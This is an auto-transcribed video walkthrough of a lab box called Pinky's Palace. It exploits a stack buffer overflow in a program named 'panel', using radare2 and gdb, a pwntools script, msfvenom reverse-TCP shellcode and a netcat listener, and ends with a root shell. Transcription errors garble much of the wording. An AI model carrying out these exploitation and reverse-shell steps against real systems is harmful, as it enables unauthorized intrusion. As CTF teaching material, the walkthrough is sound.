do it and radar easily I'm just used to this so all compile time protections are disabled canary fortify annex dat pie which is ASL everything's disabled so we don't have any compile-time protections on this program forget how in radar to say a command waiter to help is it e I forget how to do options I think it's e evaluate config variable yeah so radar - - we won't go debug - e I want to say it's followed fork equals true is the option dot slash panel not found later to follow fork maybe it's fork not follow DB g dot follow child let's see see it's dbg follow child okay so as a fork dbg not fork equals true no dot follow fork now I guess we'll try child okay if we now break on Sam handle CMD DB not be we can run this arrow binding the socket what Swiss ting on it do we have something cute that's that al MP grip pleat we do be killed s9 panel will kill this twice for good measure quit out again I'm probably could do like do food restart it but I just like reopening it okay so when we get a command it should break so it's whoops and see localhost elite test it did not child stopped so that wasn't the correct one so E and that's my environment variable let's see later to dbg dot follow Peter to config file figuration variables fork well that's not a common one do we have which file it is in equation mark C F G C F G dot debug sorry for this this takes too much longer I will do this offline and pause the video should be easy rado - Orsi fork dbg that fork oh I think I see it I think whisper low dbg Forks equals true I think that's what I want q Q yes DB g dot forks equals true analyze it so I can sit my breakpoint DC I don't know why Siri thought I said her name okay NC local host refused quit this out P kill 9 panel P kill 9 panel try this again analyze breakpoint continue until breakpoint local host 3 1 3 3 7 huh if we get rid of the follow Forks DC its runs we get in that's fine okay we can do - e DB g dot follow child equals true do we have to do both of those a a DB confuse DC attach test okay so I'm not sure what's going on a DB sim dot handle CMD it's gonna complain I do not need that frickin and or the @ sign yeah it was that at sign that was screwing me up the whole time I really gotta figure out the use case for that it's I guess just been too long I can't think straight but anyways finally we hit the breakpoint and oddly enough it's a 32-bit register and the reason it's this is I think it's because aslo is disabled for some reason in 64-bit binaries when it's compiled with the no PI flag all memory registers go to 32-bit and that's another shortcoming I'm gonna have with Rader shortly but with the break point and handle CMD if I could remember what I wanted to do that would be great so let's go back into visualization mode go to handle CMD and see what we wanted to do oh let's see oh we wanted to send a long string of crap like 100 bytes that's what we wanted to do shoot DC continue can we start yeah I follow child thing DB DC will do Python deci print a times 128 I will do 150 150 A's let's send this to the socket hit breakpoint will continue and let's see pretty sure we crashed doesn't make that obvious you know what let's just which two gdb who I'm familiar with radar is good but still learning it let's just switch what I know so P key o9p Conine to make sure it's dead and we can do gdb dot slash panel and this is gonna go much smoother so we can run this we can X if we wanted to we could do info functions I think to list them and we should see handle CMD somewhere there and all yep handle CMD is there and we can see they're all 32-bit addresses so if we want X slash let's say 50 instructions of handle CMD or there so if we want we can set a breakpoint right at this return so be breakpoint set we can run this it's default behavior is to follow those child's or forks forks I think not child's do that we hit a breakpoint and we can see let's see what do our registers look like we're probably going to crash because our SP is all A's we had club with that our VP so stack pointer base pointer and this return is going to return us to the stack pointer address which is pointed to always so if we do SI sync sev which is the SEC fault so we could do a jump call or not yet we have to pattern create first so pattern create and we can say 150 so let's do this again what's that the break point for the yeah we don't have to set the break point I don't think when you just drawn this and then crash it so localhost paste a bunch of crap and we get that sig sev and at our SP there's the one we want to find where the location is we can do pattern offset on that we see at 128 120 bytes we overwrite or SP the stack pointer so if we want we can then start creating a skeleton exploit so it's a 50/50 time and I always get to split wrong on what I want to do so then we'll go to re first then exploit PI and we want to do from bone import start to do pone tools first port is equal to pinky dB oh this is gonna be localhost actually right now localhost and elite so payload is equal to nothing payload equal a times 120 then we got payload is equal to BBB will do a peas to overwrite or SP with a bunch actually a valid address one to four zeros and four B's that should be fine actually it should be that I think because the little endian and then after that we can do payload equals C times 30 okay the next thing we have to do is create a socket to connect so R equals remote host port or dot receive until and I think it said this in the output and then our dots and line payload so let's quit run again Python exploit sent I don't think we crashed because I don't have plus equals so we just have it 30 sees and it exited so do this again run there we go we crashed and our SP is set to that so we did over right where it's pointing to repeats 30 times there's our C's I'll have her over right and we know we have to put some type of code here so we do a jump called to see if there's any like call esps because we also know that how the stack pointer works is it's the start of a code that were RSP points to so let's see if I can make something easy so we have the stack and right here that's RSP and then when it grow and right here is the overwrite so even though we're putting call yeah RSP and the overwrite we're not calling that one address we're calling what was at the front of that which is RSP if that makes sense so let's try that out it's just like jump ESP and crap 32-bit but this time we're putting it actually in the Earth's beef register instead of the or IP register just because we're to return let's see them gdb this the window was in so then exploit PI we can say P 64 that address we don't need this in quotes and let's see what happens so Python exploit and we crashed a little bit differently and that's because we actually made that jump and then started flailing so what we have to do is get some shell code and we only have a hundred some bytes hundred twenty so if we do MSF venom - L I think - I will list a loads CF MSF venom has anything while that runs we can do Linux 64-bit reverse shell shell code still running see Windows Linux exploit DB zero sum 0 X 0 this is a really smart guy I think you did a lot of the reversing of eternal blue when that all came around but this finish so let's try MSM Adam shell code first search for Linux we want Linux x64 shell reverse TCP and we can try a bunch of these but we can do - P Oh host is equal to 170 to 1610 168 no port is equal to and we'll say 4 4 4 4 - f the format is PI - OH rev shell shell code see if this works cat so we got a buff so copy we can paste this over into a exploit and what we can do is payload is equal to off and then this is going to be the Rev shell then there's gonna be junk so a times 120 minus the length of buff and that's going to get us to the overwrite and this is meaningless well just get rid of it start this up Ronit exploit probably should have started a reverse shell NCL vnp 4 4 4 see if anything happens run that's why I was killing panel twice to avoid that so quit run this and we don't get a call back so let's go check out this guy stuff you can click the video and stuff but all we want is his github so let's see this is one 27001 encoded in hex and in his post we can actually explain why this is better than MSF Adams so this is super small shell code for reverse shell it's 74 bytes and Metasploit version contains no bytes which makes it not really useful in a lot of things in order to remedy this you can encode it to be 119 bytes actually can we do that I'll try that real quick what's that venom we can say - B 0 0 that should get rid of all bytes see what the size is it's 119 we can try this again we're 19 so let's try this again we go to that just my own curiosity what a surprise me if this works and that's why the size is exactly 1 byte more than this payload so we just run panel there's gotta be a more elegant way to ensure that's dead still network let's make sure we don't have any errors buff so we can say we'll just print the payload oh my god that's why we're not crashing and we do get a call back let's try without that encoding msi venom without the bad characters wouldn't have worked with this okay let's draw that hope if I'm listening so now that doesn't work so it needs to have that - be for that but if we didn't have a hundred bytes and only had 77 or 85 cuz this shellcode is a bit more optimized he just does the inquiry against the IP in a more efficient way I guess we could try his code so let's do that and then that'll be the video so we can find the code here let's just copy his whole SL AE that course sounds familiar exactly pentester academy I think it's fantastic Adam E or I pen test it other certification place bigamy not big in the UK but it's uh is a UK no it's a French one Italian one I don't know SOA EE what to see what that courses security - yeah that's what that course get clone copy this SOA e you execute his shell bill rescript and they do dash X 464 let me do reverse shell reverse shell dot ASM and before we do that we have to set our IP address so let's them reverse shell reverse shell ASM and here's our IP address and we are 172 1610 168 so we got a hex and code that so this is little-endian so we start from the last octet and make away left so 168 and hex that is a 8 it's all lowercase then we do 10 which is a so 0 a 16 that's 10 that's confusing and then 172 is not a AC that should be it so now we can do Python shell build - act 64 reverse shell reverse shell dot ASM elf 64 and it's dash F naught X and the file Python - x64 NASM - FL 64 - Oh what if I don't have a program a dependency let's read me see unable to open up a file I think we want to be in this directory and we Python look dot dot slash shell build - x64 reverse shell ASM there we go and now we have the reverse shell code here so let's see them exploit buff is equal to shell code it's not as pretty but it should work gdb let's run this again Python exploit PI we're listening on four for four as long as they do the hex encoding this should work and there we go so we've got the reverse callback working so now the only thing left to do is do this against pinkie so it's working in our lab so as long as everything's the same which it should be because we stayed within the binary for all memory addresses and soo is disabled should all work so then exploit PI and we'll change the host to be pinky DB pinky DB Python exploit pi get a callback can we go to root and we can cat root our text because it's born hub and that is the machine I hope you guys enjoyed it take care and I'll guess I'll see you on Saturday for when the the box machine retires later